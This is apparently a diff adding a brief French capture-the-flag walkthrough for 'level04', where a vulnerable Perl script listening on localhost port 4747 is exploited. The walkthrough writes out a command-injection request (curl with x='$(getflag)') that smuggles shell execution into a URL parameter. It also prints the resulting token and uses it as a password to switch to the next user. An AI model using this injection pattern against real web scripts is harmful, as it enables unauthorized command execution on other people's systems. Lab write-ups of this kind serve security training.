@@ -1,0 +1,14 @@
+LEVEL 04
+--------
+
+1.  Commande:   ls
+    Sortie:     level04.pl
+    On suppose qu'il faut utiliser ce script.
+
+2.  Nous allons utiliser les informations obtenues dans le script.
+    En localhost port 4747 nous allons donner la valeur "getflag" à x.
+    Commande:   curl localhost:4747?x='$(getflag)'
+    Sortie:     Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+3.  Commande: su level05
+    Mdp:      ne2searoevaevoem4ov4ar8ap
